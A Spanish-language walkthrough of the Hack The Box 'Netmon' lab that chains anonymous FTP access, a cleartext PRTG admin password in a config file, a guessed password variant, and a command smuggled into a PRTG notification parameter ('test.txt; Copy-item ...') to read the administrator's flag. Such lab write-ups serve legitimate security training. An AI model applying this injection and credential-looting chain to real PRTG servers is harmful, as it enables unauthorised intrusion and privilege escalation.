## HTB-Netmon
- Maquina: Windows
- Level: Easy
- IP: 10.10.10.152

## Herramientas a utilizar:

- nmap
- 

```
nmap -sC -sV -o scan_netmon.txt 10.10.10.152
```
|PORT|STATE SERVICE|
|---|---|
|21/tcp|    open  ftp
|135/tcp|   open  msrpc
|139/tcp|   open  netbios-ssn
|445/tcp|   open  microsoft-ds

Veremo que el puerto 21 FTP esta abierto y empesaremos por en el.
```
ftp 10.10.10.152
user: anonymous
pass: anonymous
```

Ahora solo debemos enumerar 
```
cd Users\Public
```
Veremos nuestra primera flag user.txt la voy a descargar 
```
get user.txt.
```


Ahora para encontrar la flag del root, debemos probar el puerto 80
```
http://10.10.10.152
```
Tenemos web que nos pide usuario y pass. por lo que seguiremos enumerando
Volvemos otra vez utilizaremos el ftp y al ir a la siguiente ruta
```
ftp 10.10.10.152
user: anonymous
pass: anonymous
cd /programdata
cd Paessler\PRTG Network Monitor” 
```

Aqui descargaremos el archivo `PRTG Configuration.dat` .
```
get PRTG Configuration.dat
```

Abriremos el archivo `PRTG Configuration.dat` entre todo lo que contiene la siguiente linea es lo que nos debe llamar a la atencion: `<!– User: prtgadmin –> PrTg@dmin2018.”` 

Luego solo debemos probar el users/pass

>Probé esta contraseña con el usuario prtgadmin en la página de inicio de sesión, pero no funcionó.
Despues de probar todas las posible convinaciones del passwors logre acceder cambiando el año **PrTg@dmin2018** por **PrTg@dmin`2019`**

Ahora existen varios metodos para extrer la root, Pero como es constumbre HTB de poner la Flag en el Desktop del Adminsitrador. `"C:\Users\Administrator\Desktop\root.txt`

Haremos lo siguiente para extraer nuestra Flag.
1. Click **Setup.**
2. Click “Notifications” in **Account Settings.**
3. Click **Add new notification.**
4. Habilitar **Execute Program.**
5. Select **Demo exe notification - outfile.ps1” as the “Program File.**
6. Enter `test.txt`; `Copy-item "C:/Users/Administrator/Desktop/root.txt"` -Destination `"C:/Users/Public/root.txt"` as the **Parameter.**
7. Then, switch **Notification Summarization** to **Always notify ASAP, never summarize.**
8. **Save** the notification.
9. Click **Send test notification.**

Ahora solo debemos volver por el ftp he ir a la siguiente ruta
```
ftp 10.10.10.152
cd /programdata
cd Users\Public
```

Aqui encontraremos nuestra Flag de root.txt 
